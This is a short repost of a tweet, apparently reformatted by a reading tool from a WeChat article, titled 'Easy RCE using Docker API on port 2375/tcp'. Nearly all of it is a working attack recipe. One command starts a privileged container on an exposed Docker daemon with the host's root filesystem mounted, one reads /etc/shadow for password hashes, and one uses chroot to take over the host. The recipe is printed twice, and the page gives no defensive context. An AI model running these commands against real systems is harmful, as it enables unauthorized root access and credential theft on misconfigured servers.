> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4ayfBOYJZSoafBPuEQtUBg)

Easy RCE using Docker API on port 2375/tcp

Easy RCE using Docker API on port 2375/tcp

docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

File Access: cat /mnt/etc/shadow

RCE: chroot /mnt

![](https://mmbiz.qpic.cn/mmbiz_jpg/mj7qfictF08W5LyQg209MKnqW7ibjdYMOAHl74xslsw6CIv5WYDdNzicCkGzOxvvibKq0iaoiaRohscsD11S6CCNUGAQ/640?wx_fmt=jpeg)

来源推特：https://twitter.com/ptswarm/status/1338477426276511749docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine File Access: cat /mnt/etc/shadow RCE: chroot /mnt